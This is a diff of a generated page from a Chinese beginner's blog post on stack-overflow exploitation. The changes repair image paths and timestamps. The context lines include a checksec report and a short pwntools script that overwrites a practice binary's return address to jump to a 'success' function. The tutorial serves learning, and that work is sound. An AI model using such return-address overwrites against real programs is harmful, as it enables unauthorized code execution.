@@ -104,13 +104,13 @@
 <meta property="og:site_name" content="KANGEL">
 <meta property="og:description" content="1learning without thought is vain， thought without learning is idle! 不知道为什么，突然就领悟了这句早已滚瓜烂熟的孔夫子的经典名言–“学而不思则罔，思而不学则殆”。作为理工科来说，工而不理则罔，理而不工则殆。对于PWN的学习亦是如此，不动手只会越来越不想动手，而一动手就是一堆错。到头来只能感叹：“道理我都懂，可它就是不对！”为此，">
 <meta property="og:locale" content="Chinese">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/17/PWN学习之栈溢出/F:/blog/Hexo/source/_posts/PWN学习之栈溢出/1.JPG">
-<meta property="og:image" content="https://j-kangel.github.io/2019/05/17/PWN学习之栈溢出/F:/blog/Hexo/source/_posts/PWN学习之栈溢出/2.JPG">
-<meta property="og:updated_time" content="2019-05-16T16:04:33.791Z">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/17/PWN学习之栈溢出/1.JPG">
+<meta property="og:image" content="https://j-kangel.github.io/2019/05/17/PWN学习之栈溢出/2.JPG">
+<meta property="og:updated_time" content="2019-06-10T15:14:29.765Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PWN学习之栈溢出">
 <meta name="twitter:description" content="1learning without thought is vain， thought without learning is idle! 不知道为什么，突然就领悟了这句早已滚瓜烂熟的孔夫子的经典名言–“学而不思则罔，思而不学则殆”。作为理工科来说，工而不理则罔，理而不工则殆。对于PWN的学习亦是如此，不动手只会越来越不想动手，而一动手就是一堆错。到头来只能感叹：“道理我都懂，可它就是不对！”为此，">
-<meta name="twitter:image" content="https://j-kangel.github.io/2019/05/17/PWN学习之栈溢出/F:/blog/Hexo/source/_posts/PWN学习之栈溢出/1.JPG">
+<meta name="twitter:image" content="https://j-kangel.github.io/2019/05/17/PWN学习之栈溢出/1.JPG">
 
 
 
@@ -372,12 +372,24 @@
                 
               
 
-              <time title="Created: 2019-05-16 23:39:09 / Modified: 16:04:33" itemprop="dateCreated datePublished" datetime="2019-05-16T23:39:09Z">2019-05-16</time>
+              <time title="Created: 2019-05-16 23:39:09" itemprop="dateCreated datePublished" datetime="2019-05-16T23:39:09Z">2019-05-16</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-06-10 15:14:29" itemprop="dateModified" datetime="2019-06-10T15:14:29Z">2019-06-10</time>
               
             
           </span>
@@ -441,9 +453,9 @@
 <p>查看保护</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checksec stack_example</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/shared/pwn/\xe6\xa0\x88\xe6\xba\xa2\xe5\x87\xba/stack_example'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
 <p>IDA查看</p>
-<p><img src="/2019/05/17/PWN学习之栈溢出/F:/blog\Hexo\source\_posts\PWN学习之栈溢出\1.JPG" alt=""></p>
+<p><img src="/2019/05/17/PWN学习之栈溢出/1.JPG" alt=""></p>
 <p>IDA获取success地址</p>
-<p><img src="/2019/05/17/PWN学习之栈溢出/F:/blog\Hexo\source\_posts\PWN学习之栈溢出\2.JPG" alt=""></p>
+<p><img src="/2019/05/17/PWN学习之栈溢出/2.JPG" alt=""></p>
 <p>攻击脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">'./stack_example'</span>)</span><br><span class="line">success_addr = <span class="number">0x08049172</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"addr:"</span></span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>结果如下</p>
